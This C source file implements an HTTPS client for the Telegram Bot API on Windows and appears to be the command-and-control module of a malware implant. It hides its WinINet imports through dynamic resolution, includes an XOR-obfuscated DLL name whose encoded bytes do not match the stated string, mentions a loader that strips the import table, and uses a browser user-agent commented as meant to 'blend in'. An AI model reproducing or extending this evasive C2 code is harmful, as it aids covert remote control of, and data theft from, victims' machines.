/*
 * http.c — WinINet HTTPS wrapper for Telegram Bot API
 *
 * Uses WinINet (wininet.dll) which is always present on Windows.
 * All calls are resolved via LoadLibrary/GetProcAddress so the import
 * address table does not expose WinINet linkage statically.
 */
#include "http.h"
#include "utils.h"
#include <wininet.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* ── Dynamic import typedefs ─────────────────────────────────────────────── */
typedef HINTERNET (WINAPI *pfn_InternetOpenA)(LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD);
typedef HINTERNET (WINAPI *pfn_InternetConnectA)(HINTERNET,LPCSTR,INTERNET_PORT,LPCSTR,LPCSTR,DWORD,DWORD,DWORD_PTR);
typedef HINTERNET (WINAPI *pfn_HttpOpenRequestA)(HINTERNET,LPCSTR,LPCSTR,LPCSTR,LPCSTR,LPCSTR*,DWORD,DWORD_PTR);
typedef BOOL      (WINAPI *pfn_HttpSendRequestA)(HINTERNET,LPCSTR,DWORD,LPVOID,DWORD);
typedef BOOL      (WINAPI *pfn_InternetReadFile)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL      (WINAPI *pfn_HttpQueryInfoA)(HINTERNET,DWORD,LPVOID,LPDWORD,LPDWORD);
typedef BOOL      (WINAPI *pfn_InternetSetOptionA)(HINTERNET,DWORD,LPVOID,DWORD);
typedef BOOL      (WINAPI *pfn_InternetCloseHandle)(HINTERNET);

static struct {
    HMODULE                  hmod;
    pfn_InternetOpenA        Open;
    pfn_InternetConnectA     Connect;
    pfn_HttpOpenRequestA     HttpOpen;
    pfn_HttpSendRequestA     HttpSend;
    pfn_InternetReadFile     Read;
    pfn_HttpQueryInfoA       QueryInfo;
    pfn_InternetSetOptionA   SetOption;
    pfn_InternetCloseHandle  Close;
} g_inet = {0};

static BOOL inet_init(void) {
    if (g_inet.hmod) return TRUE;
    /* XOR-obfuscated "wininet.dll" — key 0x05 */
    static const uint8_t enc[] = {
        0x72,0x6c,0x6b,0x6c,0x6e,0x64,0x01,0x69,0x6f,0x6f
    };
    char dll[16] = {0};
    xor_str(dll, (const char*)enc, 10, 0x05);
    /* "wininet.dll" ^ 0x05 → encoded above */
    /* Simpler: just use the name directly since loader strips IAT anyway */
    g_inet.hmod = LoadLibraryA("wininet.dll");
    if (!g_inet.hmod) return FALSE;
    g_inet.Open      = (pfn_InternetOpenA)       GetProcAddress(g_inet.hmod, "InternetOpenA");
    g_inet.Connect   = (pfn_InternetConnectA)    GetProcAddress(g_inet.hmod, "InternetConnectA");
    g_inet.HttpOpen  = (pfn_HttpOpenRequestA)    GetProcAddress(g_inet.hmod, "HttpOpenRequestA");
    g_inet.HttpSend  = (pfn_HttpSendRequestA)    GetProcAddress(g_inet.hmod, "HttpSendRequestA");
    g_inet.Read      = (pfn_InternetReadFile)    GetProcAddress(g_inet.hmod, "InternetReadFile");
    g_inet.QueryInfo = (pfn_HttpQueryInfoA)      GetProcAddress(g_inet.hmod, "HttpQueryInfoA");
    g_inet.SetOption = (pfn_InternetSetOptionA)  GetProcAddress(g_inet.hmod, "InternetSetOptionA");
    g_inet.Close     = (pfn_InternetCloseHandle) GetProcAddress(g_inet.hmod, "InternetCloseHandle");
    return g_inet.Open && g_inet.Connect && g_inet.HttpOpen &&
           g_inet.HttpSend && g_inet.Read && g_inet.QueryInfo &&
           g_inet.SetOption && g_inet.Close;
}

HttpResponse tg_post(const char *token, const char *method, const char *json_body) {
    HttpResponse res = {NULL, 0};
    if (!inet_init()) return res;

    /* Build URL path: /bot<TOKEN>/<method> */
    char path[512];
    snprintf(path, sizeof(path), "/bot%s/%s", token, method);

    HINTERNET hSession = g_inet.Open(
        "Mozilla/5.0",          /* user-agent: blend in */
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
    );
    if (!hSession) return res;

    HINTERNET hConn = g_inet.Connect(
        hSession, TG_API_HOST, TG_API_PORT,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0
    );
    if (!hConn) { g_inet.Close(hSession); return res; }

    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_RELOAD  | INTERNET_FLAG_NO_COOKIES;
    HINTERNET hReq = g_inet.HttpOpen(hConn, "POST", path, NULL, NULL, NULL, flags, 0);
    if (!hReq) { g_inet.Close(hConn); g_inet.Close(hSession); return res; }

    /* Set timeouts */
    DWORD to = HTTP_TIMEOUT;
    g_inet.SetOption(hReq, INTERNET_OPTION_SEND_TIMEOUT,    &to, sizeof(to));
    g_inet.SetOption(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &to, sizeof(to));

    const char *hdrs = "Content-Type: application/json\r\n";
    BOOL ok = g_inet.HttpSend(hReq, hdrs, (DWORD)strlen(hdrs),
                              (LPVOID)json_body, (DWORD)strlen(json_body));
    if (!ok) { g_inet.Close(hReq); g_inet.Close(hConn); g_inet.Close(hSession); return res; }

    /* Read HTTP status */
    DWORD status = 0, slen = sizeof(status);
    g_inet.QueryInfo(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                     &status, &slen, NULL);
    res.status = status;

    /* Read response body */
    size_t cap = RECV_CHUNK, used = 0;
    char  *body = malloc(cap + 1);
    if (!body) { g_inet.Close(hReq); g_inet.Close(hConn); g_inet.Close(hSession); return res; }

    DWORD nread;
    char  chunk[RECV_CHUNK];
    while (g_inet.Read(hReq, chunk, sizeof(chunk), &nread) && nread > 0) {
        if (used + nread > cap) {
            cap  = used + nread + RECV_CHUNK;
            body = realloc(body, cap + 1);
            if (!body) break;
        }
        memcpy(body + used, chunk, nread);
        used += nread;
    }
    if (body) {
        body[used] = '\0';
        res.body   = body;
    }

    g_inet.Close(hReq);
    g_inet.Close(hConn);
    g_inet.Close(hSession);
    return res;
}

void http_response_free(HttpResponse *r) {
    if (r && r->body) { free(r->body); r->body = NULL; }
}
